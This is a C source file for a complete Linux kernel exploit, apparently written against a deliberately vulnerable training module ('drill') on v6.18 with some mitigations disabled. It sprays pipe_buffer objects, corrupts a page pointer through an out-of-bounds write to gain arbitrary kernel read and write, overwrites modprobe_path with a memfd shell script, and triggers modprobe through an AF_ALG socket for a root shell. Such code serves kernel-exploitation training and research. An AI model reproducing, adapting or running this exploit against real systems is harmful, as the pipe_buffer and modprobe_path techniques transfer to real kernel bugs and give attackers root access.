/*
 * Funny experiments with Linux kernel exploitation:
 * a basic out-of-bounds write exploit performs out-of-bounds write
 * to overwrite `pipe_buffer`->page pointer with arbitrary value,
 * allowing the attacker to write and read arbitrary memory.
 *
 * Only basic methods. Just for fun.
 *
 * 1) Use Linux kernel version tagged as `v6.18` (7d0a66e4bb9081d75c82ec4957c50034cb0ea449)
 *
 * 2) Use gcc version 13.3.0
 *
 * 3) Change these options in `defconfig`:
 *   - CONFIG_CONFIGFS_FS=y
 *   - CONFIG_SECURITYFS=y
 *   - CONFIG_DEBUG_INFO=y
 *   - CONFIG_DEBUG_INFO_DWARF5=y
 *   - CONFIG_GDB_SCRIPTS=y
 *
 * 4) Ensure that these options are disabled:
 *   - CONFIG_RANDOM_KMALLOC_CACHES (to allow naive heap spraying)
 *
 * 5) Compile the kernel and run the VM with the needed settings:
 *   - Run qemu with "-cpu qemu64,+smep,+smap"
 *   - Run the kernel with "pti=on nokaslr"
 */

#define _GNU_SOURCE

#include "drill.h"
#include <sched.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <linux/if_alg.h>

/* clang-format off */
#define PB_PER_SLAB_SLOT	2
#define SLAB_TO_FILL		10
#define OBJS_PER_SLAB		42
#define PIPES_N			OBJS_PER_SLAB *SLAB_TO_FILL
#define PIPE_CAPACITY		PAGE_SIZE *PB_PER_SLAB_SLOT

#define KMOD_PATH_LEN		256
#define MODPROBE_PTR		0xffffffff82d486e0UL

#define VIRTUAL_TO_PAGE(addr) \
	((((addr) - 0xffffffff80000000UL) / 0x1000) * 0x40 + 0xffffea0000000000UL)
/* clang-format on */

void trigger_modprobe_sock(void)
{
	struct sockaddr_alg sa = { .salg_family = AF_ALG, .salg_type = "dummy" };
	int alg_fd = -1;

	printf("[!] Triggering modprobe using AF_ALG socket to launch the root shell...\n");
	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
	printf("[!] Root shell is finished\n");

	if (alg_fd >= 0) {
		if (close(alg_fd) < 0)
			perror("[-] close alg_fd");
	}
}

int prepare_privesc_script(char *path, size_t path_size)
{
	pid_t pid = getpid();
	int script_fd = -1;
	int shell_stdin_fd = -1;
	int shell_stdout_fd = -1;
	int ret = EXIT_FAILURE;

	script_fd = memfd_create("", MFD_CLOEXEC);
	if (script_fd < 0) {
		perror("[-] memfd_create");
		return EXIT_FAILURE;
	}

	shell_stdin_fd = dup(STDIN_FILENO);
	if (shell_stdin_fd < 0) {
		perror("[-] dup");
		return EXIT_FAILURE;
	}

	shell_stdout_fd = dup(STDOUT_FILENO);
	if (shell_stdout_fd < 0) {
		perror("[-] dup");
		return EXIT_FAILURE;
	}

	ret = dprintf(script_fd, "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n", pid,
		      shell_stdin_fd, pid, shell_stdout_fd);
	if (ret < 0) {
		perror("[-] dprintf for privesc_script");
		return EXIT_FAILURE;
	}

	ret = lseek(script_fd, 0, SEEK_SET);
	if (ret < 0) {
		perror("[-] lseek for privesc_script");
		return EXIT_FAILURE;
	}

	ret = snprintf(path, path_size, "/proc/%i/fd/%i", pid, script_fd);
	if (ret < 0) {
		perror("[-] snprintf for privesc_script path");
		return EXIT_FAILURE;
	}
	if (ret >= path_size) {
		printf("[-] snprintf for privesc_script path: truncated\n");
		return EXIT_FAILURE;
	}

	printf("[+] privesc script is prepared at %s\n", path);
	return EXIT_SUCCESS;
}

int get_modprobe_path(char *buf, size_t buf_size)
{
	int fd = -1;
	ssize_t bytes = 0;
	int ret = EXIT_FAILURE;
	size_t len = 0;

	fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
	if (fd < 0) {
		perror("[-] open modprobe");
		return EXIT_FAILURE;
	}

	bytes = read(fd, buf, buf_size);
	buf[buf_size - 1] = 0;

	ret = close(fd);
	if (ret != 0)
		perror("[-] close modprobe");

	if (bytes < 0) {
		perror("[-] read modprobe");
		return EXIT_FAILURE;
	}

	len = strlen(buf);
	if (len < 1) {
		printf("[-] invalid contents of /proc/sys/kernel/modprobe\n");
		return EXIT_FAILURE;
	}
	if (buf[len - 1] != '\n') {
		printf("[-] unexpected contents of /proc/sys/kernel/modprobe\n");
		return EXIT_FAILURE;
	}
	buf[len - 1] = 0; /* skip the line feed '\n' */

	return EXIT_SUCCESS;
}

int do_cpu_pinning(int cpu_n)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(cpu_n, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		return EXIT_FAILURE;
	}

	printf("[+] pinned to CPU #%d\n", cpu_n);
	return EXIT_SUCCESS;
}

int act(int act_fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(act_fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

int main(void)
{
	bool success = false;
	char err_act[64];
	char modprobe_path[KMOD_PATH_LEN] = { 0 };
	char pipe_data[PIPE_CAPACITY];
	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
	int act_fd = -1, pipe_ret = -1;
	int ret = EXIT_FAILURE;
	int pipe_fds[PIPES_N][2];

	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
	if (ret == EXIT_FAILURE)
		goto end;

	ret = prepare_privesc_script(privesc_script_path, sizeof(privesc_script_path));
	if (ret == EXIT_FAILURE)
		goto end;

	act_fd = open("/proc/drill_act", O_WRONLY);
	if (act_fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	if (do_cpu_pinning(0) == EXIT_FAILURE)
		goto end;

	for (int i = 0; i < PIPES_N; i++) {
		pipe_ret = pipe(pipe_fds[i]);
		if (pipe_ret < 0) {
			perror("[-] pipe");
			goto end;
		}
	}
	printf("[+] Opened pipes\n");

	memset(pipe_data, 0, sizeof(pipe_data));

	for (int i = 0; i < PIPES_N; i++) {
		/* place vulnerable drill_item between pipe_buffer */
		ret = act(act_fd, DRILL_ACT_ALLOC, i, NULL);
		if (ret == EXIT_FAILURE) {
			perror("[-] drill spray");
			goto end;
		}
		/*
 		 * A `drill_item` object allocated in kmalloc-96 cache. It is known that the size of the
 		 * `pipe_buffer' is 40 bytes, which means that we need two of them to reach kmalloc-96.
 		 */
		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PIPE_CAPACITY);
		if (ret != PIPE_CAPACITY) {
			perror("[-] fcntl");
			goto end;
		}
		if (write(pipe_fds[i][1], pipe_data, sizeof(pipe_data)) < 0) {
			perror("[-] write");
			goto end;
		}
	}
	printf("[+] Sprayed pipe_buffers in kmalloc-96\n");

	printf("[*] Trying to corrupt `pipe_buffer`...\n");
	for (int d = 0; d < PIPES_N; d++) {
		snprintf(err_act, sizeof(err_act), "3 %d 0x%lx 0x50", d,
			 VIRTUAL_TO_PAGE(MODPROBE_PTR));
		ret = write(act_fd, err_act, strlen(err_act) + 1);
		if (ret <= 0) {
			ret = EXIT_FAILURE;
			goto end;
		}

		printf("[*] Trying to leak modprobe_path...\n");
		for (int i = 0; i < PIPES_N; i++) {
			ret = read(pipe_fds[i][0], pipe_data, sizeof(pipe_data));
			if (ret < 0) {
				perror("[-] read");
				goto end;
			}
			for (int j = 0; j <= (sizeof(pipe_data) - sizeof(modprobe_path)); j += 8) {
				/* clang-format off */
				if (memcmp(pipe_data + j, modprobe_path, sizeof(modprobe_path)) == 0) {
					printf("[+] Located \"%s\" at offset 0x%lx of pipe #%d\n",
					       modprobe_path, (unsigned long)j, i);
					memcpy(pipe_data + j, privesc_script_path,
					       sizeof(privesc_script_path));
					if (write(pipe_fds[i][1], pipe_data, sizeof(pipe_data)) < 0) {
						perror("[-] write");
						goto end;
					} /* clang-format on */
					success = true;
					break;
				}
			}
			if (success)
				break;
			else {
				/*
				* If we scan current pipe and it is not corrupted,
				* we will write back exactly the same data we read.
				* It helps to read pipes many times properly.
				*/
				if (write(pipe_fds[i][1], pipe_data, sizeof(pipe_data)) < 0) {
					perror("[-] write");
					goto end;
				}
			}
		}
		if (success)
			break;
		else
			printf("[-] Unable to leak modprobe_path. Trying again!\n");
	}

	if (!success) {
		printf("[-] Unable to leak modprobe_path");
		goto end;
	}

	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
	if (ret == EXIT_FAILURE)
		goto end;
	printf("[+] Overwrote modprobe_path successfully: \"%s\"\n", modprobe_path);

	trigger_modprobe_sock();
	ret = EXIT_SUCCESS;

end:
	if (pipe_ret >= 0) {
		for (int i = 0; i < PIPES_N; i++) {
			if (pipe_fds[i][0] >= 0) {
				ret = close(pipe_fds[i][0]);
				if (ret != 0)
					perror("[-] close pipe");
			}
			if (pipe_fds[i][1] >= 0) {
				ret = close(pipe_fds[i][1]);
				if (ret != 0)
					perror("[-] close pipe");
			}
		}
	}

	if (act_fd >= 0) {
		ret = close(act_fd);
		if (ret != 0)
			perror("[-] close act_fd");
	}

	if (ret == EXIT_FAILURE) {
		printf("\n[-] Exploit failed!\n");
		return ret;
	} else {
		printf("\n[+] The end! \n");
		return ret;
	}
}
